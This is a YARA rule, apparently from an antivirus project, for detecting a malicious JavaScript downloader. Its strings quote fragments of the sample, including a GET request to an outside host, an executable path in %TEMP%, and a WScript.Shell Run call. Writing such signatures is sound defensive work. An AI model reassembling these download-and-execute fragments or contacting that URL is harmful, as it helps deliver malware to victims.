rule sig_20160330_96f1c0a700cdfbc13de136c8bfbff448 {
  meta:
    description = "datamaliciousorder - file 20160330_96f1c0a700cdfbc13de136c8bfbff448.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "382e3d63b0b62d0567ac47a5c0f9144214b50b3d24d7729cfbb19b4cd6178306"

  strings:
    $s1  = "J[c](\"GET\", \"http://www.aluguerdiadema.com/p9wsld\", false);" fullword ascii
    $s2  = "function LC() {return Om[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"EhAtIrGWXmL.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[o0](Xp() * 11); if (J[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var Om = function r() {return WScript[qQ](\"WScript.Shell\");}(), er = 11;" fullword ascii
    $s5  = "function R(Zv, K0){d = d * 1; return Zv - K0;};" fullword ascii
    $s6  = "function yK(){return \"\" + EM;};" fullword ascii
    $s7  = "function G(B){Om[\"Run\"](B, d, d);};" fullword ascii
    $s8  = "function dP() {return ((wQ == true) && (wQ == Q)) ? 1 : d;};" fullword ascii
    $s9  = "var K = new this[\"Date\"]();" fullword ascii
    $s10 = "function Xp(){return 22;};" fullword ascii
    $s11 = "function U()" fullword ascii
    $s12 = "function CX(){return qQ;};" fullword ascii
    $s13 = "function XG(F) {var Hr = (1, 2, 3, 4, 5, F); return Hr;};" fullword ascii
    $s14 = "return R(R0, p);" fullword ascii
    $s15 = " while (F0){" fullword ascii
    $s16 = "Q = true; " fullword ascii
    $s17 = "var Q = false;" fullword ascii
    $s18 = "var wQ = false;" fullword ascii
    $s19 = "var Tm = false;" fullword ascii
    $s20 = "wQ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}